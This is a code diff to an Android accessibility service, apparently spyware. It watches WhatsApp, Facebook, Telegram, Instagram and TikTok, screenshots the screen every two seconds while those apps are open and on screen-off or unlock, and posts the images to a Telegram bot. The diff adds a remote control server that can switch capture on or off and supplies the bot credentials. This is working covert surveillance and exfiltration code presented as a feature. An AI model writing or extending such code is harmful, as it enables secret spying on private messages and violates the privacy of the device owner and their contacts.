@@ -1,6 +1,11 @@
+//app/src/main/java/com/example/appmonitor/MonitorService.kt//
 package com.example.appmonitor
 
 import android.accessibilityservice.AccessibilityService
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.content.IntentFilter
 import android.graphics.Bitmap
 import android.os.Handler
 import android.os.Looper
@@ -8,7 +13,6 @@ import android.view.Display
 import android.view.accessibility.AccessibilityEvent
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
-import java.io.InputStream
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
@@ -17,36 +21,82 @@ import java.util.concurrent.Executors
 class MonitorAccessibilityService : AccessibilityService() {
     private val handler = Handler(Looper.getMainLooper())
     private var isLoopActive = false
+    private var screenStateReceiver: BroadcastReceiver? = null
 
-    // د ټولو څارل شویو اپلیکیشنونو لېست
+    private val serverConfigUrl = "https://app-control-server-54oe.onrender.com/api/config"
+
     private val monitoredPackages = listOf(
-        "com.whatsapp",             // WhatsApp
-        "com.facebook.katana",      // Facebook
-        "org.telegram.messenger",   // Telegram
-        "com.instagram.android",    // Instagram
-        "com.zhiliaoapp.musically"  // TikTok
+        "com.whatsapp",
+        "com.whatsapp.w4b",
+        "com.facebook.katana",
+        "com.facebook.lite",
+        "com.facebook.orca",
+        "org.telegram.messenger",
+        "com.instagram.android",
+        "com.zhiliaoapp.musically",
+        "com.zhiliaoapp.musically.go"
     )
 
     private val screenshotRunnable = object : Runnable {
         override fun run() {
-            val activeRootNode = rootInActiveWindow
-            val activePackage = activeRootNode?.packageName?.toString()
+            fetchConfigFromServer { config ->
+                if (config == null || !config.optBoolean("active", true)) {
+                    isLoopActive = false
+                    return@fetchConfigFromServer
+                }
 
-            if (activePackage != null && monitoredPackages.contains(activePackage)) {
-                captureAndSendScreenshot(activePackage)
-                handler.postDelayed(this, 2000) // هر ۲ ثانیې وروسته عکس اخلي
-            } else {
-                isLoopActive = false
+                val activeRootNode = rootInActiveWindow
+                val activePackage = activeRootNode?.packageName?.toString()
+
+                if (activePackage != null && monitoredPackages.contains(activePackage)) {
+                    captureAndSendScreenshot(activePackage, "app_$activePackage", config)
+                    handler.postDelayed(this, 2000)
+                } else {
+                    isLoopActive = false
+                }
+            }
+        }
+    }
+
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        registerScreenReceiver()
+    }
+
+    private fun registerScreenReceiver() {
+        val filter = IntentFilter().apply {
+            addAction(Intent.ACTION_SCREEN_OFF)
+            addAction(Intent.ACTION_USER_PRESENT)
+        }
+        screenStateReceiver = object : BroadcastReceiver() {
+            override fun onReceive(context: Context?, intent: Intent?) {
+                when (intent?.action) {
+                    Intent.ACTION_SCREEN_OFF -> {
+                        captureScreenEvent("screen_off")
+                    }
+                    Intent.ACTION_USER_PRESENT -> {
+                        handler.postDelayed({
+                            captureScreenEvent("screen_unlocked")
+                        }, 1000)
+                    }
+                }
+            }
+        }
+        registerReceiver(screenStateReceiver, filter)
+    }
+
+    private fun captureScreenEvent(tag: String) {
+        fetchConfigFromServer { config ->
+            if (config != null && config.optBoolean("active", true)) {
+                captureAndSendScreenshot("", tag, config)
             }
         }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
-
         val packageName = event.packageName?.toString() ?: return
 
-        // که کوم څارل شوی اپ پرانیستل شو
         if (monitoredPackages.contains(packageName)) {
             if (!isLoopActive) {
                 isLoopActive = true
@@ -61,15 +111,29 @@ class MonitorAccessibilityService : AccessibilityService() {
         }
     }
 
-    private fun captureAndSendScreenshot(currentPackage: String) {
+    private fun fetchConfigFromServer(callback: (JSONObject?) -> Unit) {
+        Thread {
+            try {
+                val url = URL(serverConfigUrl)
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "GET"
+                conn.connectTimeout = 10000
+                conn.readTimeout = 10000
+
+                val responseString = conn.inputStream.bufferedReader().use { it.readText() }
+                val jsonObject = JSONObject(responseString)
+                handler.post { callback(jsonObject) }
+            } catch (e: Exception) {
+                e.printStackTrace()
+                handler.post { callback(null) }
+            }
+        }.start()
+    }
+
+    private fun captureAndSendScreenshot(currentPackage: String, customPrefix: String, config: JSONObject) {
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
             takeScreenshot(Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(), object : TakeScreenshotCallback {
                 override fun onSuccess(screenshot: ScreenshotResult) {
-                    val activeRootNode = rootInActiveWindow
-                    val activePackage = activeRootNode?.packageName?.toString()
-                    
-                    if (activePackage == null || !monitoredPackages.contains(activePackage)) return
-
                     val hardwareBuffer = screenshot.hardwareBuffer
                     val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshot.colorSpace)
                     hardwareBuffer.close()
@@ -78,7 +142,7 @@ class MonitorAccessibilityService : AccessibilityService() {
                         val mutableBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true)
                         val stream = ByteArrayOutputStream()
                         mutableBitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
-                        sendTelegramPhoto(stream.toByteArray(), activePackage)
+                        sendTelegramPhoto(stream.toByteArray(), customPrefix, config)
                     }
                 }
 
@@ -87,69 +151,56 @@ class MonitorAccessibilityService : AccessibilityService() {
         }
     }
 
-    private fun sendTelegramPhoto(photoBytes: ByteArray, appPackage: String) {
-        try {
-            val inputStream: InputStream = assets.open("server.json")
-            val jsonString = inputStream.bufferedReader().use { it.readText() }
-            val jsonObject = JSONObject(jsonString)
-            val botToken = jsonObject.getString("bot_token")
-            val chatId = jsonObject.getString("chat_id")
+    private fun sendTelegramPhoto(photoBytes: ByteArray, prefix: String, config: JSONObject) {
+        Thread {
+            try {
+                val botToken = config.getString("bot_token")
+                val chatId = config.getString("chat_id")
 
-            // د فایل نوم د وخت (Timestamp) سره جوړوو تر څو هېڅکله تکرار نشي او تلګرام یې ونه ردوي
-            val timeStamp = System.currentTimeMillis()
-            val prefix = when (appPackage) {
-                "com.whatsapp" -> "whatsapp"
-                "com.facebook.katana" -> "facebook"
-                "org.telegram.messenger" -> "telegram"
-                "com.instagram.android" -> "instagram"
-                "com.zhiliaoapp.musically" -> "tiktok"
-                else -> "monitor"
+                val timeStamp = System.currentTimeMillis()
+                val fileName = "${prefix}_${timeStamp}.jpg"
+
+                val boundary = "Boundary_" + System.currentTimeMillis()
+                val urlString = "https://api.telegram.org/bot$botToken/sendPhoto"
+                val url = URL(urlString)
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.doOutput = true
+                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+
+                val outputStream = conn.outputStream
+                val writer = OutputStreamWriter(outputStream, "UTF-8")
+
+                writer.append("--$boundary\r\n")
+                writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
+                writer.append("$chatId\r\n")
+                writer.flush()
+
+                writer.append("--$boundary\r\n")
+                writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"$fileName\"\r\n")
+                writer.append("Content-Type: image/jpeg\r\n\r\n")
+                writer.flush()
+
+                outputStream.write(photoBytes)
+                outputStream.flush()
+
+                writer.append("\r\n--$boundary--\r\n")
+                writer.flush()
+                writer.close()
+
+                conn.responseCode
+            } catch (e: Exception) {
+                e.printStackTrace()
             }
-            val fileName = "${prefix}_${timeStamp}.jpg"
-
-            Thread {
-                try {
-                    val boundary = "Boundary_" + System.currentTimeMillis()
-                    val urlString = "https://api.telegram.org/bot$botToken/sendPhoto"
-                    val url = URL(urlString)
-                    val conn = url.openConnection() as HttpURLConnection
-                    conn.requestMethod = "POST"
-                    conn.doOutput = true
-                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
-
-                    val outputStream = conn.outputStream
-                    val writer = OutputStreamWriter(outputStream, "UTF-8")
-
-                    writer.append("--$boundary\r\n")
-                    writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
-                    writer.append("$chatId\r\n")
-                    writer.flush()
-
-                    writer.append("--$boundary\r\n")
-                    writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"$fileName\"\r\n")
-                    writer.append("Content-Type: image/jpeg\r\n\r\n")
-                    writer.flush()
-
-                    outputStream.write(photoBytes)
-                    outputStream.flush()
-
-                    writer.append("\r\n--$boundary--\r\n")
-                    writer.flush()
-                    writer.close()
-
-                    conn.responseCode
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                }
-            }.start()
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
+        }.start()
     }
 
-    override fun onUnbind(intent: android.content.Intent?): Boolean {
+    override fun onUnbind(intent: Intent?): Boolean {
         isLoopActive = false
         handler.removeCallbacks(screenshotRunnable)
+        if (screenStateReceiver != null) {
+            unregisterReceiver(screenStateReceiver)
+        }
         return super.onUnbind(intent)
     }
 
